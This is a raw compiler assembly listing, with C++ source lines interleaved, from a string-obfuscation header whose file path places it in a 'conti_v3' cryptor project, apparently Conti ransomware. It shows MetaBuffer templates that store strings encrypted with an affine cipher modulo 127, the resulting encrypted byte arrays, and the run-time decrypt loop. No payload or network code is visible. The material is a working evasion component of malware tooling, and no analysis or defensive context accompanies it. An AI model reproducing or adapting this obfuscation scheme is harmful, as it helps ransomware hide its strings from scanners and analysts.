; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 76	 mov	 BYTE PTR [rcx+3], 118	; 00000076H
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 2a	 mov	 BYTE PTR [rcx+5], 42	; 0000002aH
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 32	 mov	 BYTE PTR [rcx+7], 50	; 00000032H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 14	 mov	 BYTE PTR [rcx+9], 20
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	c6 41 0b 69	 mov	 BYTE PTR [rcx+11], 105	; 00000069H
  0002f	c6 41 0c 6f	 mov	 BYTE PTR [rcx+12], 111	; 0000006fH
  00033	c6 41 0d 22	 mov	 BYTE PTR [rcx+13], 34	; 00000022H
  00037	c6 41 0e 6f	 mov	 BYTE PTR [rcx+14], 111	; 0000006fH
  0003b	c6 41 0f 14	 mov	 BYTE PTR [rcx+15], 20
  0003f	c6 41 10 6f	 mov	 BYTE PTR [rcx+16], 111	; 0000006fH
  00043	c6 41 11 76	 mov	 BYTE PTR [rcx+17], 118	; 00000076H
  00047	c6 41 12 6f	 mov	 BYTE PTR [rcx+18], 111	; 0000006fH
  0004b	c6 41 13 22	 mov	 BYTE PTR [rcx+19], 34	; 00000022H
  0004f	c6 41 14 6f	 mov	 BYTE PTR [rcx+20], 111	; 0000006fH
  00053	c6 41 15 14	 mov	 BYTE PTR [rcx+21], 20
  00057	c6 41 16 6f	 mov	 BYTE PTR [rcx+22], 111	; 0000006fH
  0005b	c6 41 17 6d	 mov	 BYTE PTR [rcx+23], 109	; 0000006dH
  0005f	c6 41 18 6f	 mov	 BYTE PTR [rcx+24], 111	; 0000006fH
  00063	c6 41 19 2a	 mov	 BYTE PTR [rcx+25], 42	; 0000002aH
  00067	c6 41 1a 6f	 mov	 BYTE PTR [rcx+26], 111	; 0000006fH
  0006b	c6 41 1b 11	 mov	 BYTE PTR [rcx+27], 17
  0006f	c6 41 1c 6f	 mov	 BYTE PTR [rcx+28], 111	; 0000006fH
  00073	c6 41 1d 32	 mov	 BYTE PTR [rcx+29], 50	; 00000032H
  00077	c6 41 1e 6f	 mov	 BYTE PTR [rcx+30], 111	; 0000006fH
  0007b	c6 41 1f 6d	 mov	 BYTE PTR [rcx+31], 109	; 0000006dH
  0007f	c6 41 20 6f	 mov	 BYTE PTR [rcx+32], 111	; 0000006fH
  00083	c6 41 21 21	 mov	 BYTE PTR [rcx+33], 33	; 00000021H
  00087	c6 41 22 6f	 mov	 BYTE PTR [rcx+34], 111	; 0000006fH
  0008b	c6 41 23 09	 mov	 BYTE PTR [rcx+35], 9
  0008f	c6 41 24 6f	 mov	 BYTE PTR [rcx+36], 111	; 0000006fH
  00093	c6 41 25 14	 mov	 BYTE PTR [rcx+37], 20
  00097	c6 41 26 6f	 mov	 BYTE PTR [rcx+38], 111	; 0000006fH
  0009b	c6 41 27 5d	 mov	 BYTE PTR [rcx+39], 93	; 0000005dH
  0009f	c6 41 28 6f	 mov	 BYTE PTR [rcx+40], 111	; 0000006fH
  000a3	c6 41 29 6e	 mov	 BYTE PTR [rcx+41], 110	; 0000006eH
  000a7	c6 41 2a 6f	 mov	 BYTE PTR [rcx+42], 111	; 0000006fH
  000ab	c6 41 2b 32	 mov	 BYTE PTR [rcx+43], 50	; 00000032H
  000af	c6 41 2c 6f	 mov	 BYTE PTR [rcx+44], 111	; 0000006fH
  000b3	c6 41 2d 4c	 mov	 BYTE PTR [rcx+45], 76	; 0000004cH
  000b7	c6 41 2e 6f	 mov	 BYTE PTR [rcx+46], 111	; 0000006fH
  000bb	c6 41 2f 14	 mov	 BYTE PTR [rcx+47], 20
  000bf	c6 41 30 6f	 mov	 BYTE PTR [rcx+48], 111	; 0000006fH
  000c3	c6 41 31 7e	 mov	 BYTE PTR [rcx+49], 126	; 0000007eH
  000c7	c6 41 32 6f	 mov	 BYTE PTR [rcx+50], 111	; 0000006fH
  000cb	c6 41 33 09	 mov	 BYTE PTR [rcx+51], 9
  000cf	c6 41 34 6f	 mov	 BYTE PTR [rcx+52], 111	; 0000006fH
  000d3	c6 41 35 14	 mov	 BYTE PTR [rcx+53], 20
  000d7	c6 41 36 6f	 mov	 BYTE PTR [rcx+54], 111	; 0000006fH
  000db	c6 41 37 6d	 mov	 BYTE PTR [rcx+55], 109	; 0000006dH
  000df	c6 41 38 6f	 mov	 BYTE PTR [rcx+56], 111	; 0000006fH
  000e3	c6 41 39 4c	 mov	 BYTE PTR [rcx+57], 76	; 0000004cH
  000e7	c6 41 3a 6f	 mov	 BYTE PTR [rcx+58], 111	; 0000006fH
  000eb	c6 41 3b 5d	 mov	 BYTE PTR [rcx+59], 93	; 0000005dH
  000ef	c6 41 3c 6f	 mov	 BYTE PTR [rcx+60], 111	; 0000006fH
  000f3	c6 41 3d 33	 mov	 BYTE PTR [rcx+61], 51	; 00000033H
  000f7	c6 41 3e 6f	 mov	 BYTE PTR [rcx+62], 111	; 0000006fH
  000fb	c6 41 3f 65	 mov	 BYTE PTR [rcx+63], 101	; 00000065H
  000ff	c6 41 40 6f	 mov	 BYTE PTR [rcx+64], 111	; 0000006fH
  00103	c6 41 41 32	 mov	 BYTE PTR [rcx+65], 50	; 00000032H
  00107	c6 41 42 6f	 mov	 BYTE PTR [rcx+66], 111	; 0000006fH
  0010b	c6 41 43 11	 mov	 BYTE PTR [rcx+67], 17
  0010f	c6 41 44 6f	 mov	 BYTE PTR [rcx+68], 111	; 0000006fH
  00113	c6 41 45 14	 mov	 BYTE PTR [rcx+69], 20
  00117	c6 41 46 6f	 mov	 BYTE PTR [rcx+70], 111	; 0000006fH
  0011b	c6 41 47 6e	 mov	 BYTE PTR [rcx+71], 110	; 0000006eH
  0011f	c6 41 48 6f	 mov	 BYTE PTR [rcx+72], 111	; 0000006fH
  00123	c6 41 49 11	 mov	 BYTE PTR [rcx+73], 17
  00127	c6 41 4a 6f	 mov	 BYTE PTR [rcx+74], 111	; 0000006fH
  0012b	c6 41 4b 5d	 mov	 BYTE PTR [rcx+75], 93	; 0000005dH
  0012f	c6 41 4c 6f	 mov	 BYTE PTR [rcx+76], 111	; 0000006fH
  00133	c6 41 4d 54	 mov	 BYTE PTR [rcx+77], 84	; 00000054H
  00137	c6 41 4e 6f	 mov	 BYTE PTR [rcx+78], 111	; 0000006fH
  0013b	c6 41 4f 11	 mov	 BYTE PTR [rcx+79], 17
  0013f	c6 41 50 6f	 mov	 BYTE PTR [rcx+80], 111	; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 6d	 mov	 BYTE PTR [rcx+81], 109	; 0000006dH
  00147	c6 41 52 6f	 mov	 BYTE PTR [rcx+82], 111	; 0000006fH
  0014b	c6 41 53 3b	 mov	 BYTE PTR [rcx+83], 59	; 0000003bH
  0014f	c6 41 54 6f	 mov	 BYTE PTR [rcx+84], 111	; 0000006fH
  00153	c6 41 55 04	 mov	 BYTE PTR [rcx+85], 4
  00157	c6 41 56 6f	 mov	 BYTE PTR [rcx+86], 111	; 0000006fH
  0015b	c6 41 57 6f	 mov	 BYTE PTR [rcx+87], 111	; 0000006fH
  0015f	c6 41 58 6f	 mov	 BYTE PTR [rcx+88], 111	; 0000006fH
  00163	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00167	48 8b c1	 mov	 rax, rcx
  0016a	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 60 00 00
	00		 mov	 r10d, 96		; 00000060H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 2e 00 00 00	 mov	 eax, 46			; 0000002eH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 54	 mov	 BYTE PTR [rcx+1], 84	; 00000054H
  00007	c6 41 02 2e	 mov	 BYTE PTR [rcx+2], 46	; 0000002eH
  0000b	c6 41 03 41	 mov	 BYTE PTR [rcx+3], 65	; 00000041H
  0000f	c6 41 04 2e	 mov	 BYTE PTR [rcx+4], 46	; 0000002eH
  00013	c6 41 05 3d	 mov	 BYTE PTR [rcx+5], 61	; 0000003dH
  00017	c6 41 06 2e	 mov	 BYTE PTR [rcx+6], 46	; 0000002eH
  0001b	c6 41 07 22	 mov	 BYTE PTR [rcx+7], 34	; 00000022H
  0001f	c6 41 08 2e	 mov	 BYTE PTR [rcx+8], 46	; 0000002eH
  00023	c6 41 09 6c	 mov	 BYTE PTR [rcx+9], 108	; 0000006cH
  00027	c6 41 0a 2e	 mov	 BYTE PTR [rcx+10], 46	; 0000002eH
  0002b	c6 41 0b 55	 mov	 BYTE PTR [rcx+11], 85	; 00000055H
  0002f	c6 41 0c 2e	 mov	 BYTE PTR [rcx+12], 46	; 0000002eH
  00033	c6 41 0d 44	 mov	 BYTE PTR [rcx+13], 68	; 00000044H
  00037	c6 41 0e 2e	 mov	 BYTE PTR [rcx+14], 46	; 0000002eH
  0003b	c6 41 0f 32	 mov	 BYTE PTR [rcx+15], 50	; 00000032H
  0003f	c6 41 10 2e	 mov	 BYTE PTR [rcx+16], 46	; 0000002eH
  00043	c6 41 11 2b	 mov	 BYTE PTR [rcx+17], 43	; 0000002bH
  00047	c6 41 12 2e	 mov	 BYTE PTR [rcx+18], 46	; 0000002eH
  0004b	c6 41 13 6c	 mov	 BYTE PTR [rcx+19], 108	; 0000006cH
  0004f	c6 41 14 2e	 mov	 BYTE PTR [rcx+20], 46	; 0000002eH
  00053	c6 41 15 36	 mov	 BYTE PTR [rcx+21], 54	; 00000036H
  00057	c6 41 16 2e	 mov	 BYTE PTR [rcx+22], 46	; 0000002eH
  0005b	c6 41 17 55	 mov	 BYTE PTR [rcx+23], 85	; 00000055H
  0005f	c6 41 18 2e	 mov	 BYTE PTR [rcx+24], 46	; 0000002eH
  00063	c6 41 19 65	 mov	 BYTE PTR [rcx+25], 101	; 00000065H
  00067	c6 41 1a 2e	 mov	 BYTE PTR [rcx+26], 46	; 0000002eH
  0006b	c6 41 1b 36	 mov	 BYTE PTR [rcx+27], 54	; 00000036H
  0006f	c6 41 1c 2e	 mov	 BYTE PTR [rcx+28], 46	; 0000002eH
  00073	c6 41 1d 7e	 mov	 BYTE PTR [rcx+29], 126	; 0000007eH
  00077	c6 41 1e 2e	 mov	 BYTE PTR [rcx+30], 46	; 0000002eH
  0007b	c6 41 1f 55	 mov	 BYTE PTR [rcx+31], 85	; 00000055H
  0007f	c6 41 20 2e	 mov	 BYTE PTR [rcx+32], 46	; 0000002eH
  00083	c6 41 21 53	 mov	 BYTE PTR [rcx+33], 83	; 00000053H
  00087	c6 41 22 2e	 mov	 BYTE PTR [rcx+34], 46	; 0000002eH
  0008b	c6 41 23 5a	 mov	 BYTE PTR [rcx+35], 90	; 0000005aH
  0008f	c6 41 24 2e	 mov	 BYTE PTR [rcx+36], 46	; 0000002eH
  00093	c6 41 25 32	 mov	 BYTE PTR [rcx+37], 50	; 00000032H
  00097	c6 41 26 2e	 mov	 BYTE PTR [rcx+38], 46	; 0000002eH
  0009b	c6 41 27 55	 mov	 BYTE PTR [rcx+39], 85	; 00000055H
  0009f	c6 41 28 2e	 mov	 BYTE PTR [rcx+40], 46	; 0000002eH
  000a3	c6 41 29 53	 mov	 BYTE PTR [rcx+41], 83	; 00000053H
  000a7	c6 41 2a 2e	 mov	 BYTE PTR [rcx+42], 46	; 0000002eH
  000ab	c6 41 2b 2b	 mov	 BYTE PTR [rcx+43], 43	; 0000002bH
  000af	c6 41 2c 2e	 mov	 BYTE PTR [rcx+44], 46	; 0000002eH
  000b3	c6 41 2d 03	 mov	 BYTE PTR [rcx+45], 3
  000b7	c6 41 2e 2e	 mov	 BYTE PTR [rcx+46], 46	; 0000002eH
  000bb	c6 41 2f 36	 mov	 BYTE PTR [rcx+47], 54	; 00000036H
  000bf	c6 41 30 2e	 mov	 BYTE PTR [rcx+48], 46	; 0000002eH
  000c3	c6 41 31 55	 mov	 BYTE PTR [rcx+49], 85	; 00000055H
  000c7	c6 41 32 2e	 mov	 BYTE PTR [rcx+50], 46	; 0000002eH
  000cb	c6 41 33 67	 mov	 BYTE PTR [rcx+51], 103	; 00000067H
  000cf	c6 41 34 2e	 mov	 BYTE PTR [rcx+52], 46	; 0000002eH
  000d3	c6 41 35 4f	 mov	 BYTE PTR [rcx+53], 79	; 0000004fH
  000d7	c6 41 36 2e	 mov	 BYTE PTR [rcx+54], 46	; 0000002eH
  000db	c6 41 37 6e	 mov	 BYTE PTR [rcx+55], 110	; 0000006eH
  000df	c6 41 38 2e	 mov	 BYTE PTR [rcx+56], 46	; 0000002eH
  000e3	c6 41 39 55	 mov	 BYTE PTR [rcx+57], 85	; 00000055H
  000e7	c6 41 3a 2e	 mov	 BYTE PTR [rcx+58], 46	; 0000002eH
  000eb	c6 41 3b 49	 mov	 BYTE PTR [rcx+59], 73	; 00000049H
  000ef	c6 41 3c 2e	 mov	 BYTE PTR [rcx+60], 46	; 0000002eH
  000f3	c6 41 3d 36	 mov	 BYTE PTR [rcx+61], 54	; 00000036H
  000f7	c6 41 3e 2e	 mov	 BYTE PTR [rcx+62], 46	; 0000002eH
  000fb	c6 41 3f 6c	 mov	 BYTE PTR [rcx+63], 108	; 0000006cH
  000ff	c6 41 40 2e	 mov	 BYTE PTR [rcx+64], 46	; 0000002eH
  00103	c6 41 41 5b	 mov	 BYTE PTR [rcx+65], 91	; 0000005bH
  00107	c6 41 42 2e	 mov	 BYTE PTR [rcx+66], 46	; 0000002eH
  0010b	c6 41 43 41	 mov	 BYTE PTR [rcx+67], 65	; 00000041H
  0010f	c6 41 44 2e	 mov	 BYTE PTR [rcx+68], 46	; 0000002eH
  00113	c6 41 45 4f	 mov	 BYTE PTR [rcx+69], 79	; 0000004fH
  00117	c6 41 46 2e	 mov	 BYTE PTR [rcx+70], 46	; 0000002eH
  0011b	c6 41 47 6c	 mov	 BYTE PTR [rcx+71], 108	; 0000006cH
  0011f	c6 41 48 2e	 mov	 BYTE PTR [rcx+72], 46	; 0000002eH
  00123	c6 41 49 0f	 mov	 BYTE PTR [rcx+73], 15
  00127	c6 41 4a 2e	 mov	 BYTE PTR [rcx+74], 46	; 0000002eH
  0012b	c6 41 4b 32	 mov	 BYTE PTR [rcx+75], 50	; 00000032H
  0012f	c6 41 4c 2e	 mov	 BYTE PTR [rcx+76], 46	; 0000002eH
  00133	c6 41 4d 32	 mov	 BYTE PTR [rcx+77], 50	; 00000032H
  00137	c6 41 4e 2e	 mov	 BYTE PTR [rcx+78], 46	; 0000002eH
  0013b	c6 41 4f 5a	 mov	 BYTE PTR [rcx+79], 90	; 0000005aH
  0013f	c6 41 50 2e	 mov	 BYTE PTR [rcx+80], 46	; 0000002eH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 32	 mov	 BYTE PTR [rcx+81], 50	; 00000032H
  00147	c6 41 52 2e	 mov	 BYTE PTR [rcx+82], 46	; 0000002eH
  0014b	c6 41 53 55	 mov	 BYTE PTR [rcx+83], 85	; 00000055H
  0014f	c6 41 54 2e	 mov	 BYTE PTR [rcx+84], 46	; 0000002eH
  00153	c6 41 55 25	 mov	 BYTE PTR [rcx+85], 37	; 00000025H
  00157	c6 41 56 2e	 mov	 BYTE PTR [rcx+86], 46	; 0000002eH
  0015b	c6 41 57 55	 mov	 BYTE PTR [rcx+87], 85	; 00000055H
  0015f	c6 41 58 2e	 mov	 BYTE PTR [rcx+88], 46	; 0000002eH
  00163	c6 41 59 67	 mov	 BYTE PTR [rcx+89], 103	; 00000067H
  00167	c6 41 5a 2e	 mov	 BYTE PTR [rcx+90], 46	; 0000002eH
  0016b	c6 41 5b 03	 mov	 BYTE PTR [rcx+91], 3
  0016f	c6 41 5c 2e	 mov	 BYTE PTR [rcx+92], 46	; 0000002eH
  00173	c6 41 5d 0a	 mov	 BYTE PTR [rcx+93], 10
  00177	c6 41 5e 2e	 mov	 BYTE PTR [rcx+94], 46	; 0000002eH
  0017b	c6 41 5f 2e	 mov	 BYTE PTR [rcx+95], 46	; 0000002eH
  0017f	c6 41 60 2e	 mov	 BYTE PTR [rcx+96], 46	; 0000002eH
  00183	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00187	48 8b c1	 mov	 rax, rcx
  0018a	c3		 ret	 0
